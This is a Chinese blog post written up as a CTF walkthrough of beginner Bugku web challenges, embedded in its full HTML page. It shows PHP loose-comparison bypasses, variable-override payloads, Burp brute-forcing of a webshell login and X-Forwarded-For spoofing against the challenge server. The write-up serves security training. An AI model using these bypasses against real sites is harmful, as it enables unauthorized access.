@@ -1,0 +1,1632 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="https://fonts.css.network//css?family=Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|STLiti:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Bugku Web Write up  Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。">
+<meta name="keywords" content="Bugku,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku Web Write up">
+<meta property="og:url" content="http://miracle778.github.io/CTF/Bugku/Web/Bugku-Web-Write-up.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="Bugku Web Write up  Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x01//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x02//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x03//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x03//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x04//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x04//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x04//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x04//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x04//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x05//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x05//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x06//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x06//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x07//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x07//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x07//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x09//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x09//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x10//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x10//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x11//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x11//2.JPG">
+<meta property="og:image" content="http://bugku-web-write-up//0x12//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x12//1.JPG">
+<meta property="og:image" content="http://bugku-web-write-up//0x12//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x12//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x12//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x13//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x13//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x13//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x13//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x14//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x14//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x14//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x14//4.JPG">
+<meta property="og:image" content="http://bugku-web-write-up//0x15//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x15//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x15//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x16//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x16//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x17//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x17//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x17//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x18//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x18//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x18//3.png">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x18//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x19//6.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x20//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x20//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x21//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x21//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x21//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x21//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x21//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x22//1.png">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x22//1.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x22//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x22//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x23//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x23//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x23//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x23//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x24//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x24//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x24//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x25//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x25//2.JPG">
+<meta property="og:updated_time" content="2019-04-07T13:20:13.567Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bugku Web Write up">
+<meta name="twitter:description" content="Bugku Web Write up  Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。">
+<meta name="twitter:image" content="http://miracle778.github.io/CTF/Bugku/Web//Bugku-Web-Write-up//0x01//1.JPG">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/CTF/Bugku/Web/Bugku-Web-Write-up.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Bugku Web Write up | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/CTF/Bugku/Web/Bugku-Web-Write-up.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Bugku Web Write up
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-07 11:07:19 / 修改时间：21:20:13" itemprop="dateCreated datePublished" datetime="2019-04-07T11:07:19+08:00">2019-04-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/Bugku/" itemprop="url" rel="index"><span itemprop="name">Bugku</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/Bugku/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/CTF/Bugku/Web/Bugku-Web-Write-up.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/CTF/Bugku/Web/Bugku-Web-Write-up.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">11k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">10 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center><strong>Bugku Web Write up</strong></center>
+
+<p style="text-indent:27px">Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。</p>
+
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>进度稍微延迟了这么一点，本来是想着前天刷完，昨天写Blog。结果碰上最后几个注入题，有点自闭，多搞了一点时间，导致进度一拖再拖，昨天又玩了一下午游戏无所作为。想着不能再拖了，必须今天写掉，不然过几天忘干净了再写就没意义了。所以稍微少几个题，以后再写吧</p>
+<hr>
+<p>直接从题目开写吧，遇到相应知识再拓展。</p>
+<h2 id="基础题"><a href="#基础题" class="headerlink" title="基础题"></a>基础题</h2><h3 id="0x01-Web2"><a href="#0x01-Web2" class="headerlink" title="0x01 Web2"></a>0x01 Web2</h3><p>点进去一堆滑稽js脚本<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x01\\1.JPG" alt><br>结合题目描述：“听说聪明的人都能找到答案” ，直接按F12。ctrl+F搜索flag，找到。</p>
+<h3 id="0x02-计算器"><a href="#0x02-计算器" class="headerlink" title="0x02 计算器"></a>0x02 计算器</h3><p>点进题目，发现标题是随机数字运算验证码。本来还以为是要利用Session，写python脚本提交。最后居然只是前端输入框长度被限制。<br>所以打开F12，找到输入框前端代码，更改输入框最大长度，再输入表达式计算值，弹出flag<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x02\\1.JPG" alt></p>
+<h3 id="0x03-web基础-GET"><a href="#0x03-web基础-GET" class="headerlink" title="0x03 web基础$_GET"></a>0x03 web基础$_GET</h3><p>点进去看到题目给了源码。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x03\\1.JPG" alt><br>只需构造get请求传入what=flag即可。payload：<code>http://123.206.87.240:8002/get/?what=flag</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x03\\2.JPG" alt></p>
+<h3 id="0x04-web基础-POST"><a href="#0x04-web基础-POST" class="headerlink" title="0x04 web基础$_POST"></a>0x04 web基础$_POST</h3><p>点进去发现题目源码。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x04\\1.JPG" alt><br>与上题类似，不过是GET请求变成了POST，使用火狐插件hackbar或者其他类似插件构造post请求即可。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x04\\2.JPG" alt><br>这里注意，不要直接用burp将GET改POST，亲测无效。如下图示</p>
+<ol>
+<li>不用hackbar正常的GET请求<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x04\\3.JPG" alt></li>
+<li>将GET直接修改成POST提交数据无效<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x04\\4.JPG" alt><br><strong>这里据我个人分析，是因为直接改成POST后，服务器不知道接受的数据是什么类型。所以得不到flag，于是在文件头中加上Content-Type，得出了flag，证明猜测是对的</strong></li>
+<li>文件头加上Content-Type<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x04\\5.JPG" alt><h4 id="小小总结"><a href="#小小总结" class="headerlink" title="小小总结"></a>小小总结</h4>以后需要改POST的还是直接用hackbar吧，233~</li>
+</ol>
+<h3 id="0x05-矛盾"><a href="#0x05-矛盾" class="headerlink" title="0x05 矛盾"></a>0x05 矛盾</h3><p>点击题目后，看到源码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x05\\1.JPG" alt><br>分析可知，需要GET传入num为数字1才能输出flag，但是如果输入纯数字的话，直接不满足if条件，进不去if语句里面，就输出不了flag。<br>但是这里判断num等于1，用的是==，而不是===，就用到了php弱类型比较，即 <code>1 == 1miracle</code>是为true的。弱类型比较自行参照搜索引擎。<br>于是可以构造payload：<code>http://123.206.87.240:8002/get/index1.php?num=1miracle778</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x05\\2.JPG" alt></p>
+<h3 id="0x06-web3"><a href="#0x06-web3" class="headerlink" title="0x06 web3"></a>0x06 web3</h3><p>题目描述为: flag就在这里快来找找吧<br>点击题目去，弹了一个框说flag就在这里，来找找吧<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x06\\1.JPG" alt><br>一开始还没想到flag藏的具体位置，于是只能F12,看一下源码及http文件头。结果发现弹框的那段js代码，如下图,原来”在这里”的意思是说在js代码里。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x06\\2.JPG" alt><br>直接找到flag：<br><code>&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</code></p>
+<p>实体解码即可得flag：<code>KEY{J2sa42ahJK-HS11III}</code></p>
+<h3 id="0x07-你必须让他停下"><a href="#0x07-你必须让他停下" class="headerlink" title="0x07 你必须让他停下"></a>0x07 你必须让他停下</h3><p>点击题目去，如下图，页面一直在刷新，图片也是不停更换<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x07\\1.JPG" alt><br>按照图中页面所述，本来以为要停在弹出一个熊猫的图片的地方，结果在页面出等了几秒，发现有些图片根本不存在，只有这一张2333~<br>于是打开burp,看到访问历史里，jpg的名字随机更换，而且页面响应的地方有一个flag is here，如下图划线处。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x07\\2.JPG" alt><br>所以可以使用repeat一直按Go重放，直到出现flag为止。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x07\\3.JPG" alt></p>
+<h3 id="0x08-文件包含"><a href="#0x08-文件包含" class="headerlink" title="0x08 文件包含"></a>0x08 文件包含</h3><p>好像题目链接挂了。。。</p>
+<h3 id="0x09-变量1"><a href="#0x09-变量1" class="headerlink" title="0x09 变量1"></a>0x09 变量1</h3><p>点击题目，看到源码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x09\\1.JPG" alt><br>分析一下，可以看到var_dump那里出现$$,存在变量覆盖，前面正则对args进行了过滤，只能输入[a-z][0-9][A-Z]。<br>因为存在变量覆盖，所以我们传入args=GLOBALS,即可达到输出$GLOBALS数组的目的，GLOBALS为php的超全局变量，一个包含了全部变量的全局组合数组。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x09\\2.JPG" alt></p>
+<h3 id="0x10-web5"><a href="#0x10-web5" class="headerlink" title="0x10 web5"></a>0x10 web5</h3><p>题目描述：JSPFUCK??????答案格式CTF{**}<br>点进题目并查看源码，发现一堆js混淆过的jsfuck。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x10\\1.JPG" alt><br>复制下来直接输入F12控制台即可得到flag，再将ctf改为大写即可<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x10\\2.JPG" alt></p>
+<h3 id="0x11-头等舱"><a href="#0x11-头等舱" class="headerlink" title="0x11 头等舱"></a>0x11 头等舱</h3><p>点进题目如图,源代码里也找不到啥东西<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x11\\1.JPG" alt><br>结合题目：头等舱 猜测flag藏在http头里<br>于是直接在响应的Headers里面找到<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x11\\2.JPG" alt></p>
+<h2 id="初级题"><a href="#初级题" class="headerlink" title="初级题"></a>初级题</h2><h3 id="0x12-网站被黑"><a href="#0x12-网站被黑" class="headerlink" title="0x12 网站被黑"></a>0x12 网站被黑</h3><p>点进题目去，是一个如下图示界面,源代码、HTTP头都没找到什么东西<br><img src="\\Bugku-Web-Write-up\\0x12\\2.JPG" alt><br>结合题目意思，网站被黑，说不定留下了什么后门。<br>于是用御剑(或者其他工具)扫一下后台,发现shell.php<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x12\\1.JPG" alt><br>访问一下，看到一个登录框,随便输个密码，出现如图所警告<br><img src="\\Bugku-Web-Write-up\\0x12\\4.JPG" alt><br>到这一步的话，没有其他提示，只能先通过万能密码看看能不能绕过登录，不能的话再暴力破解<br>用万能密码绕过失败，尝试Burp暴力破解，Burp暴力破解具体操作自行百度，或者参考我之前发的<a href="https://miracle778.github.io/Web%E5%AE%89%E5%85%A8/DVWA/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html">Dvwa暴力破解</a><br>暴力破解选择simple list里的password字典进行爆破<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x12\\3.JPG" alt><br>得到密码为hack<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x12\\5.JPG" alt><br>输入密码即可得flag</p>
+<h3 id="0x13-管理员系统"><a href="#0x13-管理员系统" class="headerlink" title="0x13 管理员系统"></a>0x13 管理员系统</h3><p>点进题目如图示,使用万能密码测试登录，提示说IP不允许访问，联系本地管理员登录<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x13\\1.JPG" alt><br>于是添加XXF(X-Forwarded-For)=127.0.0.1进行登录尝试，提示说密码不对<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x13\\2.JPG" alt><br>从上面尝试知道，万能密码不管用，所以密码可能藏在某个地方(也是凑巧发现233~)<br>查看源代码，发现有一行诡异的base64注释，解码可得内容为<code>test123</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x13\\3.JPG" alt><br>于是用admin&amp;test123进行登录，同时添加XXF头，得到flag<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x13\\4.JPG" alt></p>
+<h3 id="0x14-web4"><a href="#0x14-web4" class="headerlink" title="0x14 web4"></a>0x14 web4</h3><p>题目如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x14\\1.JPG" alt><br>按提示查看源代码，如图发现一段被url编码的js脚本<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x14\\2.JPG" alt><br>将这段代码进行解码，如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x14\\3.JPG" alt><br>通过阅读源码分析，只要在输入框输入<code>67d709b2b54aa2aa648cf6e87a7114f1</code>即可得到flag<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x14\\4.JPG" alt></p>
